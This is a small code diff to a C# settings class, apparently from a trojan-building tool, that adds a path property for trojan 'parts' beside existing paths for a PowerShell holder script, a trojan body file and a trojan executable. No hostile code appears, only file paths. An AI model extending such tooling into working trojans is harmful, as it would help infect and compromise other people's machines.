@@ -74,7 +74,10 @@ namespace model
         
         [JsonPropertyName("troyanOutputParts")] public string TroyanOutputBuiltDir => Path.Join(TroyanOutputDir, @".\parts");
         
+        
         [JsonPropertyName("userTroyanHolder")] public string UserTroyanHolder => Path.Join(UserDataDir, "troyan_holder.ps1");
+        [JsonPropertyName("userTroyanParts")] public string UserTroyanParts => Path.Join(UserDataDir, @".\parts");
+
         [JsonPropertyName("userTroyanHolderParts")] public string UserTroyanHolderParts => Path.Join(UserDataDir, "troyan_holder_parts.ps1");
         [JsonPropertyName("userTroyanBody")] public string UserTroyanBody => Path.Join(UserDataDir, "troyan_body.txt");
         [JsonPropertyName("userTroyanExe")] public string UserTroyanExe => Path.Join(UserDataDir, "troyan.exe");
